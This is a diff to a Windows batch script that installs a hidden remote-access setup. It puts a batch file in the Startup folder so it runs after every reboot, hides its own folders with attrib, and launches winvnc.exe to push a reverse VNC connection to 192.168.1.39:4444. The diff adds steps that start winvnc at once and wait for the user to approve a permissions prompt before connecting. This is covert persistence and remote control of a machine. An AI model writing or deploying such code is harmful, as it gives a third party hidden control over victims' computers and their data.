@@ -8,19 +8,17 @@ REM Create the batch file for startup folder (startup_winvnc.bat)
   echo @echo off
   echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
   echo cd /d "%~dp0"
-  echo start /min "" winvnc.exe  REM Start winvnc.exe in minimized window
-  echo timeout /t 7 >nul  REM Wait for 7 seconds for user to allow permissions
   echo call "%~dp0run_winvnc.bat"
 ) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"
 
 REM Create the batch file to run winvnc.exe (run_winvnc.bat)
 (
   echo @echo off
-  echo taskkill /im winvnc.exe /f >nul  REM Kill all instances of winvnc.exe
-  echo timeout /t 1 >nul  REM Wait 1 second after killing processes
-  echo start winvnc.exe -run  REM Start winvnc.exe with batch commands
-  echo timeout /t 1 >nul  REM Wait 1 second before connecting
-  echo winvnc.exe -connect 192.168.1.39::4444  REM Connect to the specified address
+  echo taskkill /im winvnc.exe /f
+  echo timeout /t 1 >nul
+  echo start winvnc.exe -run
+  echo timeout /t 1 >nul
+  echo winvnc.exe -connect 192.168.1.39::4444
 ) > "%script_dir%run_winvnc.bat"
 
 REM Check if both batch files exist in their respective locations
@@ -39,5 +37,14 @@ if exist "%script_dir%run_winvnc.bat" (
 REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
+
+REM Start winvnc.exe to trigger permissions prompt
+start "" winvnc.exe
+
+REM Wait for 7 seconds to allow the user to grant permissions
+timeout /t 7 >nul
+
+REM Run the run_winvnc.bat script
+call "%script_dir%run_winvnc.bat"
 
 REM End of main.bat
